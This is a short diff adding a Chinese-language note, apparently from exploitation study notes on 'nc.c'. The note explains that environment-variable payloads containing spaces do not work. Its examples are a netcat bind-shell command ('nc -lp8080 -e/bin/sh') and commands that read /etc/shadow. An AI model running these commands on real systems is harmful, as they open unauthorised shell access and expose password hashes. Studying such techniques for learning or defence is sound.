@@ -214,6 +214,16 @@ nc.c
 
 
 
+注意点：有空格的环境变量是不可以用的。比如下面的是不可以用的。
+
+$ export RUN="nc -lp8080 -e/bin/sh"
+
+$ export RUN="cat /etc/shadow"
+
+$ export RUN="\"cat /etc/shadow\""
+
+
+
 ref：
 
 [https://blog.csdn.net/stonesharp/article/details/38402953?utm\_source=blogxgwz4](https://blog.csdn.net/stonesharp/article/details/38402953?utm_source=blogxgwz4)
